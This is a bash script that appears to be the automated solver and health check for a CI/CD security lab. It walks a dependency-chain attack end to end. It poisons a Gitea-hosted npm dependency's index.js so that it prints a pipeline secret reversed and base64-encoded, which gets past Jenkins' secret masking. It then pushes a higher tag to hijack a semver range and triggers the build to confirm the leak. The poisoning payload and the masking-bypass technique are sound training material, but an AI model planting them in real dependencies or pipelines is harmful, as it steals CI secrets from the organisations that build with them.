#!/bin/bash
# tw-solve: the lab's automated dependency-chain-abuse solver and self-check (CICD-SEC-3).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000 and Jenkins at 127.0.0.1:8080, and has git + curl + node + npm). It walks the intended
# attack end-to-end and asserts it still works, so a learner whose box broke is told to reset it:
#
#   1. clone Wonderland/twiddledee (the DEPENDENCY) with the attacker's WRITE credentials (alice)
#   2. POISON its index.js to read the pipeline's bound FLAG6 and print reverse(FLAG6) base64-encoded
#      (reversed first: modern Jenkins masks a bound secret AND its plain base64, so a transform is
#      needed), bump the package version, commit, and push a HIGHER git tag (1.2.0) so twiddledum's
#      `#semver:^1.1.0` range resolves to the poisoned commit
#   3. trigger the twiddledum multibranch pipeline (its build runs `npm install --ignore-scripts`
#      then `node index.js`, which require()s twiddledee and so runs the poisoned module)
#   4. read the build's console output and assert the exfiltrated (reversed-base64) flag is there
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated through the poisoned dependency,
# but NEVER prints the flag (that is the answer the player submits).
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${TW_JENKINS_URL:-http://127.0.0.1:8080}"
ORG="Wonderland"
DEP="twiddledee"                # the dependency the attacker controls
JOB="wonderland-twiddledum"     # the consuming pipeline
BRANCH="main"

ATTACKER="alice:alice"          # the attacker: WRITE access to the dependency repo
JAUTH="admin:admin"             # a Jenkins user who can read the build console
FLAG_FILE="${TW_FLAG_FILE:-/run/lab/casc_secrets/flag6}"
DEADLINE=$(( $(date +%s) + ${TW_DEADLINE:-360} ))

log()  { echo "tw-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

jget()  { curl -s -m 10 -u "$JAUTH" "$@"; }
jcode() { curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }
# build number of a Jenkins job URL ('' when there is none yet)
jnum()  { jget "$1/api/json?tree=number" 2>/dev/null | sed -n 's/.*"number":\([0-9]*\).*/\1/p'; }

# --- the expected exfiltration, computed from the flag the credential store holds -----------------
# Read from the same file JCasC used; never printed. The poisoned dependency prints
# base64(reverse(FLAG6)); reproduce exactly that (byte-for-byte, via node) and search the console.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
command -v node >/dev/null 2>&1 || fail "node is required on the controller"
EXPECTED="$(FLAG_VAL="$FLAG" node -e 'process.stdout.write(Buffer.from((process.env.FLAG_VAL||"").split("").reverse().join("")).toString("base64"))')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

# --- 1. wait for Gitea's dependency repo and the Jenkins pipeline to be ready ---------------------
log "waiting for the $DEP repository on Gitea..."
until curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$ATTACKER" \
        "$GITEA/api/v1/repos/$ORG/$DEP/branches/main" 2>/dev/null | grep -q '^200$'; do
  left || fail "the Gitea dependency repository never became ready"; sleep 3
done

log "waiting for the Jenkins multibranch job to exist..."
until [ "$(jcode "$JENKINS/job/$JOB/api/json")" = "200" ]; do
  left || fail "the Jenkins job never appeared"; sleep 3
done

# --- 2. clone the dependency, poison it, and push a higher tag ------------------------------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="alice" GIT_AUTHOR_EMAIL="alice@wonderland.example"
export GIT_COMMITTER_NAME="alice" GIT_COMMITTER_EMAIL="alice@wonderland.example"
REMOTE="http://$ATTACKER@$GITEA_HOST/$ORG/$DEP.git"

git clone -q "$REMOTE" "$WORK/repo" || fail "could not clone the dependency (attacker write creds)"
cd "$WORK/repo" || fail "clone directory missing"

# Payload lives in the dependency's MAIN module (index.js), which twiddledum require()s — not in an
# npm lifecycle script, because the pipeline installs with --ignore-scripts.
cat > index.js <<'POISON'
'use strict'
// twiddledee (poisoned): read the consuming pipeline's bound token and exfiltrate it in a form the
// Jenkins console masker will not catch (reverse the value before base64-encoding it).
var flag = process.env.FLAG6 || ''
console.log(Buffer.from(flag.split('').reverse().join('')).toString('base64'))
module.exports = function twiddle (value) { return String(value).split('').reverse().join('') }
POISON

# Bump the version so the new 1.2.0 tag carries a matching manifest (not required for execution).
sed -i 's/"version": *"1.1.0"/"version": "1.2.0"/' package.json 2>/dev/null || true

git add -A
git commit -q -m "twiddledee 1.2.0"
git tag 1.2.0
git push -q "$REMOTE" "$BRANCH" || fail "could not push to the dependency's main"
git push -q "$REMOTE" 1.2.0 || fail "could not push the poisoned tag 1.2.0"
log "pushed poisoned $DEP and tag 1.2.0 (the mutable ref now resolves to the attacker's commit)"
cd / >/dev/null 2>&1 || true

# --- 3. make sure the twiddledum/main branch job exists, then trigger a fresh build ---------------
# A Jenkins crumb-authenticated POST. $1 = job path under $JENKINS to POST .../build to.
trigger() {
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 10 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 10 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$1/build" 2>/dev/null
  rm -f "$cj"
}

log "indexing the multibranch pipeline so the $BRANCH job exists..."
until [ "$(jcode "$JENKINS/job/$JOB/job/$BRANCH/api/json")" = "200" ]; do
  trigger "$JENKINS/job/$JOB"           # "Scan Repository Now"
  left || fail "the $BRANCH pipeline was never discovered"; sleep 5
done

BRANCH_JOB="$JENKINS/job/$JOB/job/$BRANCH"
START="$(jnum "$BRANCH_JOB/lastBuild")"; START="${START:-0}"
log "triggering a twiddledum build (last build was #${START})..."
trigger "$BRANCH_JOB"

# --- 4. poll the build console for the exfiltrated flag -------------------------------------------
log "waiting for the pipeline to resolve the poisoned dependency and exfiltrate the flag..."
nudged=0
while left; do
  console="$(jget "$BRANCH_JOB/lastBuild/consoleText" 2>/dev/null)"
  if printf '%s' "$console" | grep -qF -- "$EXPECTED"; then
    log "OK: the GLOBAL-scope flag6 credential (${#FLAG} chars) was exfiltrated through the poisoned"
    log "    twiddledee dependency — the reversed-base64 blob is in the twiddledum build console"
    log "    (flag itself not shown)."
    exit 0
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && trigger "$BRANCH_JOB"   # re-trigger roughly every 30s
  sleep 5
done

fail "the flag did not appear in the pipeline console before the deadline"
